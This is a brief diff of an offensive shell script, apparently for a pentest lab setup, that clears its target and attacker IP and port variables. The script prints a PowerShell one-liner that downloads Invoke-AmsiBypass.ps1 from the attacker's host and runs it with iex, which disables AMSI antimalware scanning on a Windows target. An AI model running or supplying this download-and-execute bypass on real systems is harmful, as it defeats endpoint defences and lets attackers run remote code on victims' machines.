@@ -1,7 +1,7 @@
-TargetIP="10.10.10.10"
+TargetIP=""
 TargetPort=""
-AttackerIP="10.10.10.16"
-AttackerPort="443"
+AttackerIP=""
+AttackerPort=""
 
 echo -e '\e[1mBypass\033[0m'
 echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Bypass/Invoke-AmsiBypass.ps1\"); Invoke-AmsiBypass"
